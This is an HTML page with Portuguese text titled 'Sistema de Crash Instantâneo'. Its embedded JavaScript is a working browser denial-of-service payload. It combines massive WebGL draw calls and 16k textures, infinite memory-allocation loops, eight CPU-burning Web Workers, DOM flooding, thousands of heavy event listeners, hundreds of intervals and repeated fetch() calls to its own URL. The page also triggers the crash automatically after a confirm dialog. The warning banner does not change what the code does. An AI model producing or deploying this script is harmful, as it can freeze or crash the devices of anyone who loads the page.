<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Sistema de Crash Instantâneo</title>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: Arial; text-align: center; }
        canvas { border: 2px solid #fff; display: block; margin: 20px auto; }
        #status { margin: 20px; font-size: 24px; color: red; }
        #warning { margin: 10px; color: red; font-weight: bold; }
        button { padding: 15px 30px; font-size: 18px; margin: 10px; cursor: pointer; }
    </style>
</head>
<body>
    <div id="warning">PERIGO EXTREMO: Isso TRAVARÁ seu dispositivo instantaneamente! Use apenas em máquina virtual ou hardware descartável.</div>
    <div id="status">Clique no botão para iniciar o crash instantâneo</div>
    
    <button id="crashButton">INICIAR CRASH INSTANTÂNEO</button>
    <canvas id="gl-canvas" width="400" height="300"></canvas>

    <script>
        // Inicializa WebGL
        const canvas = document.getElementById('gl-canvas');
        const gl = canvas.getContext('webgl');
        if (!gl) {
            alert('WebGL não suportado. Use Chrome/Firefox atualizado.');
            throw new Error('WebGL não suportado');
        }

        // Shaders simples
        const vertexShaderSource = `
            attribute vec2 a_position;
            void main() {
                gl_Position = vec4(a_position, 0.0, 1.0);
            }
        `;
        
        const fragmentShaderSource = `
            precision highp float;
            void main() {
                gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0);
            }
        `;

        // Compila shaders
        function createShader(gl, type, source) {
            const shader = gl.createShader(type);
            gl.shaderSource(shader, source);
            gl.compileShader(shader);
            return shader;
        }

        // Cria programa WebGL
        const vertexShader = createShader(gl, gl.VERTEX_SHADER, vertexShaderSource);
        const fragmentShader = createShader(gl, gl.FRAGMENT_SHADER, fragmentShaderSource);
        const program = gl.createProgram();
        gl.attachShader(program, vertexShader);
        gl.attachShader(program, fragmentShader);
        gl.linkProgram(program);
        gl.useProgram(program);

        // Função de crash instantâneo
        function crashSystem() {
            document.getElementById('status').textContent = 'CRASH INICIADO! TRAVANDO SISTEMA...';
            
            try {
                // 1. WebGL: Milhões de pontos + loop infinito
                const vertexCount = 5000000; // 5 milhões de vértices
                const crashVertices = new Float32Array(vertexCount * 2);
                for (let i = 0; i < vertexCount * 2; i++) {
                    crashVertices[i] = Math.random() * 2 - 1;
                }
                
                const positionLocation = gl.getAttribLocation(program, 'a_position');
                const crashBuffer = gl.createBuffer();
                gl.bindBuffer(gl.ARRAY_BUFFER, crashBuffer);
                gl.bufferData(gl.ARRAY_BUFFER, crashVertices, gl.STATIC_DRAW);
                gl.enableVertexAttribArray(positionLocation);
                gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);

                // Loop WebGL infinito e pesado
                function crashWebGLLoop() {
                    gl.clear(gl.COLOR_BUFFER_BIT);
                    // Desenha múltiplas vezes por frame
                    for (let i = 0; i < 100; i++) {
                        gl.drawArrays(gl.POINTS, 0, vertexCount);
                    }
                    // Texturas enormes em cada frame
                    const texture = gl.createTexture();
                    gl.bindTexture(gl.TEXTURE_2D, texture);
                    const size = 16384; // Textura 16k x 16k
                    const data = new Uint8Array(size * size * 4);
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
                    
                    requestAnimationFrame(crashWebGLLoop);
                }
                crashWebGLLoop();

                // 2. Estouro de memória massivo
                setTimeout(() => {
                    const memoryArrays = [];
                    while (true) {
                        memoryArrays.push(new Float64Array(10000000)); // 10 milhões de doubles
                        memoryArrays.push(new Array(5000000).fill({data: new Array(1000)})); // Objetos complexos
                    }
                }, 50);

                // 3. Web Workers para múltiplos núcleos
                function createCrashWorker() {
                    const workerCode = `
                        // CPU intensivo
                        while(true) {
                            let result = 0;
                            for(let i = 0; i < 10000000; i++) {
                                result += Math.sqrt(Math.sin(Math.cos(i)));
                            }
                            
                            // Memória no worker
                            const arr = [];
                            for(let j = 0; j < 10000; j++) {
                                arr.push(new Float64Array(100000));
                            }
                        }
                    `;
                    
                    const blob = new Blob([workerCode], { type: 'application/javascript' });
                    const url = URL.createObjectURL(blob);
                    return new Worker(url);
                }

                // Criar múltiplos workers
                for (let i = 0; i < 8; i++) { // Para sistemas com até 8 cores
                    setTimeout(() => createCrashWorker(), i * 100);
                }

                // 4. Bombardeio de DOM
                setTimeout(() => {
                    while (true) {
                        for (let i = 0; i < 5000; i++) {
                            const element = document.createElement('div');
                            element.innerHTML = '<div>'.repeat(1000);
                            document.body.appendChild(element);
                        }
                    }
                }, 100);

                // 5. Event listeners infinitos
                setTimeout(() => {
                    for (let i = 0; i < 10000; i++) {
                        window.addEventListener('click', () => {
                            const heavyCalc = () => {
                                let total = 0;
                                for (let j = 0; j < 1000000; j++) {
                                    total += Math.random();
                                }
                                return total;
                            };
                            for (let k = 0; k < 100; k++) heavyCalc();
                        });
                    }
                }, 150);

                // 6. Intervalos infinitos
                for (let i = 0; i < 100; i++) {
                    setInterval(() => {
                        const arr = new Array(100000).fill().map(() => Math.random());
                        arr.sort((a, b) => a - b);
                    }, 10);
                }

                // 7. Tentativas de rede (se disponível)
                setTimeout(() => {
                    setInterval(() => {
                        for (let i = 0; i < 100; i++) {
                            fetch(window.location.href).catch(() => {});
                        }
                    }, 100);
                }, 200);

            } catch (e) {
                // Ignora erros - o objetivo é crashar mesmo
                console.error('Erro durante crash:', e);
            }
        }

        // Inicia crash instantaneamente ao clicar no botão
        document.getElementById('crashButton').addEventListener('click', () => {
            document.body.style.backgroundColor = 'red';
            crashSystem();
        });

        // Opcional: iniciar automaticamente após 3 segundos
        setTimeout(() => {
            if (!confirm('CRASH IRÁ INICIAR EM 5 SEGUNDOS! Clique OK para continuar ou CANCELAR para abortar.')) {
                return;
            }
            document.getElementById('status').textContent = 'INICIANDO CRASH AUTOMÁTICO EM 5s...';
            setTimeout(crashSystem, 5000);
        }, 3000);

    </script>
</body>
</html>
